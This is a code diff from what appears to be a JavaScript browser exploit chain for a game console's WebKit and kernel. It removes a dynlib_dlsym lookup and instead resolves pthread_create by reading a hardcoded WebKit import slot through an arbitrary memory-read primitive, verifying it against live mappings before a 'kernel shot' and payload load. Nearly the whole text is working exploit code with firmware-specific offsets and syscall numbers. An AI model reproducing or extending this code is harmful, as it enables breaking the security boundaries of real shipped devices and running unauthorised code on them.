@@ -32,7 +32,7 @@ const S = {
   read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
   getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
   getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
-  cpuset_setaffinity: 488, dynlib_dlsym: 591,
+  cpuset_setaffinity: 488,
   dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
@@ -1181,7 +1181,7 @@ async function attempt(ctx, opts) {
   }
   STATE.pthread = resolvePthreadCreate();
   if (!STATE.pthread) {
-    say("[p] pthread_create could not be resolved from the exact libkernel module; no kernel shot fired");
+    say("[p] pthread_create import failed live mapping checks; no kernel shot fired");
     return false;
   }
 
@@ -1637,36 +1637,44 @@ async function fetchBytes(url, tag) {
 
 function resolvePthreadCreate() {
   const c = host();
-  if (!c.libkernelBase) return null;
-  const ids = alloc(4 * 0x300), count = alloc(8), info = alloc(0x160);
-  wipe(ids, ids.u8.length); wipe(count, 8);
-  if (sc(S.dynlib_get_list, ids.at, 0x300, count.at).i32 !== 0) return null;
-  const n = count.dv.getUint32(0, true);
-  if (n === 0 || n > 0x300) return null;
-  for (let i = 0; i < n; i++) {
-    wipe(info, 0x160); info.dv.setUint32(0, 0x160, true);
-    const id = ids.dv.getUint32(i * 4, true);
-    if (sc(S.dynlib_get_info, id, info.at).i32 !== 0) continue;
-    let name = "";
-    for (let j = 8; j < 0x100 && info.u8[j] !== 0; j++)
-      name += String.fromCharCode(info.u8[j]);
-    if (!/^libkernel(?:_web)?\.sprx$/i.test(name) ||
-        !same(qAt(info, 0x108), c.libkernelBase)) continue;
-    for (const symbol of ["pthread_create", "scePthreadCreate"]) {
-      const out = alloc(8); wipe(out, 8);
-      const rv = sc(S.dynlib_dlsym, id, cstr(symbol).at, out.at).i32;
-      if (rv !== 0) continue;
-      const fn = qAt(out, 0);
-      const delta = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW +
-        (fn.low - (c.libkernelBase.low >>> 0));
-      if (fn.hi === (c.libkernelBase.hi >>> 0) && delta > 0 && delta < 0x400000) {
-        say("[p] resolved " + symbol + " through libkernel handle " + id +
-          " at +0x" + delta.toString(16));
-        return fn;
-      }
-    }
+  if (!c.webkitBase || !c.libkernelBase || !MAPS || !MAPS.length) return null;
+
+  /* The browser's pthread_create import is the four-argument POSIX entry.
+     14.02 uses the 13.52 WebKit layout already used by the primitive. The
+     original host used this slot; verify both the slot and target against
+     the live mappings before trusting its value. dynlib_get_info does not
+     provide a base here, and stock dynlib_dlsym may deny browser callers. */
+  function mapped(at, length) {
+    const lo = at.hi * LOW + (at.low >>> 0);
+    const hi = lo + length;
+    return MAPS.some(function (m) {
+      const start = m[0].hi * LOW + (m[0].low >>> 0);
+      const end = m[1].hi * LOW + (m[1].low >>> 0);
+      return lo >= start && hi <= end;
+    });
   }
-  return null;
+  const slot = plus(c.webkitBase, 0x3cb9c00);
+  if (!mapped(slot, 8)) {
+    say("[p] pthread_create import slot is outside the live WebKit map");
+    return null;
+  }
+  const fn = c.p.read8(slot);
+  const delta = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW +
+    (fn.low - (c.libkernelBase.low >>> 0));
+  if (fn.hi !== (c.libkernelBase.hi >>> 0) || delta <= 0 ||
+      delta >= 0x400000 || !mapped(fn, 16)) {
+    say("[p] pthread_create import target " + text(fn) +
+      " is outside the mapped libkernel code range");
+    return null;
+  }
+  const head = rdbuf(fn, 16);
+  if (head.every(function (byte) { return byte === 0 || byte === 0xcc; })) {
+    say("[p] pthread_create import target has no executable code");
+    return null;
+  }
+  say("[p] pthread_create import +0x3cb9c00 points to libkernel +0x" +
+    delta.toString(16));
+  return fn;
 }
 
 async function loadPayload(url, vorab) {
